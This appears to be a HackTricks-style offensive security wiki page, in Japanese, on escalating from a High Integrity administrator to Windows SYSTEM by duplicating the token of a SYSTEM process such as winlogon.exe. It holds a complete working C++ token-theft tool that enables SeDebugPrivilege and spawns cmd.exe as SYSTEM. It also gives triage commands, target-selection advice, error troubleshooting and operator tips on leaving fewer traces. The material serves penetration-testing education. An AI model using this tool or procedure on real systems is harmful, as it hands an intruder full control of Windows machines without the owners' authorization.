# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

このページでは、**High Integrity administrator process** から、**保護されていない SYSTEM process を開き、その token を複製して、その token で child process を起動する**ことにより、**`NT AUTHORITY\SYSTEM`** へ移行する**manual** 方式について説明します。

**`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** しか持っておらず、適切な SYSTEM process を開けない場合は、通常、**Potato / named-pipe** path のほうが信頼性が高くなります。

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

`SYSTEM` だけでなく、可能な限り多くの privileges を持つ **SYSTEM token** が必要な場合は、こちらも確認してください。

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

token を steal する前に、まず context を簡単に検証します。
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
実践的な注意事項:

- **High Integrity** admin token があれば、通常は **`SeDebugPrivilege` を有効化**し、保護されていない多くの SYSTEM process を開くのに十分です。
- **`CreateProcessWithTokenW` は caller に **`SeImpersonatePrivilege`** が必要です。この API が `1314` で失敗した場合は、SYSTEM primary token をすでに duplicate した後で **`CreateProcessAsUserW`** に切り替えてください。
- 最新の Windows では、**LSA protection / PPL** により、**`SeDebugPrivilege`** を持つ administrators であってもアクセスがブロックされるため、**`lsass.exe` は適切な target にならないことが多い**です。代わりに、SYSTEM として実行されている **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`**、または初期段階の **`svchost.exe`** を優先してください。
- すべての SYSTEM process が同じように有用な token を持つわけではありません。SYSTEM を取得できても不足している privileges に気付いた場合は、technique が壊れていると判断せず、別の SYSTEM process を試してください。

## PID を慎重に選択する

この手法を確実に動作させる最も簡単な方法は、Administrators が process を query し、その token を duplicate できる DACL を実際に持つ SYSTEM process を**選択する**ことです。

最初にテストする候補:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM として実行されている一部の初期 `svchost.exe` instances

デフォルトで避けるもの:

- **RunAsPPL / LSA protection** が有効な hosts 上の `lsass.exe`
- **`SeDebugPrivilege`** を有効化した後でも `Access denied` を返す protected / security-sensitive processes

昇格した状態で実行した **Process Explorer** または **Process Hacker** を使って、候補となる processes とその token/ACLs を確認できます。

### コード

以下の code は [this access-token article](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962) からのものです。**process ID を argument として受け取り**、その process の**ユーザーとして** command shell を起動します。<sup>[[3]](#references)</sup>\
High Integrity process 内で実行すると、**System として実行されている process（`winlogon`、`wininit` など）の PID を指定**し、SYSTEM として `cmd.exe` を実行できます。<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-right notes

このサンプルでは `MAXIMUM_ALLOWED` を使用していますが、実際の操作では、関係する最小限の要素を覚えておくと便利です。

- `OpenProcessToken()` には、**プロセスハンドル**が **`PROCESS_QUERY_LIMITED_INFORMATION`** で開かれていることだけが必要です。
- `CreateProcessWithTokenW()` を使用するには、**primary token handle** に **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** が必要です。<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` では、単なる impersonation token ではなく、**primary token**（`TokenPrimary`）を作成する必要があります。
- すでに SYSTEM を impersonate していても `CreateProcessWithTokenW()` が `1314` で失敗する場合は、代わりに `CreateProcessAsUserW()` を試してください。

つまり、token を query するために必要な権限だけを要求するよりも、対象プロセスを `PROCESS_ALL_ACCESS` で開くことは通常不要であり、より多くの痕跡を残します。

## エラー

System を impersonate しようとしても機能せず、次のような出力が表示される場合があります:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
これは、High Integrity levelで実行している場合でも、対象のプロセス/tokenに対して**十分な権限がない**ことを意味します。\
**Process Explorer**（または**Process Hacker**）で、`svchost.exe`プロセスに対する現在のAdministrator権限を確認してみましょう。

1. `svchost.exe`のプロセスを選択
2. 右クリック --> Properties
3. "Security"タブ内の右下にある"Permissions"ボタンをクリック
4. "Advanced"をクリック
5. "Administrators"を選択して"Edit"をクリック
6. "Show advanced permissions"をクリック

![Code - エラー: 6. "Show advanced permissions"をクリック](<../../images/image (437).png>)

上の画像には、選択したプロセスに対して"Administrators"が持つすべての権限が表示されています（`svchost.exe`の場合、"Query"権限しかないことがわかります）。

`winlogon.exe`に対して"Administrators"が持つ権限を確認してください。

![Code - エラー: "Administrators"がwinlogon.exeに対して持つ権限を確認](<../../images/image (1102).png>)

このプロセス内では、"Administrators"は"Read Memory"および"Read Permissions"を実行できます。これにより、Administratorsはこのプロセスが使用するtokenをimpersonateできる可能性があります。

### よくある失敗原因

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: プロセスのDACLによってブロックされているか、対象が**protected/PPL**です。別のSYSTEMプロセスを選択してください。
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: token handleが十分な権限なしで開かれているか、対象tokenのDACLによって複製が阻止されています。
- **`CreateProcessWithTokenW()` -> `1314`**: 呼び出し元で現在、**`SeImpersonatePrivilege`**が有効になっていません。まず有効化するか、複製したprimary tokenで`CreateProcessAsUserW()`を使用してください。
- 以前の失敗後に**`CreateProcessWithTokenW()` -> `1326`**が発生する場合: 多くの場合、先行するtokenの複製またはimpersonationの手順が失敗しているだけで、child processを起動できる使用可能なprimary tokenが存在しません。

## Operator notes

- このtechniqueは、すでに**local admin + high integrity**の状態で、serviceやnamed-pipe coercion chainを構築せず、手早くSYSTEMへ移行したい場合に有効です。
- HardenedなWindows 11 / Server環境では、**LSA protectionが一般的になりつつある**ため、`lsass.exe`が常に読み取り可能であることを前提とするworkflowは脆弱です。通常は、最初の候補として**`winlogon.exe` / `wininit.exe` / `services.exe`**を選ぶ方が適しています。<sup>[[2]](#references)</sup>
- 昇格されたadmin desktopではなく、**service account**のcontextを取得した場合は、このページの方法よりも通常、**Potato family**の方が適しています。



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: LSASSに触れずにWindowsのtokenを悪用してActive Directoryを侵害する方法](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Process Tokenの理解と悪用 — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
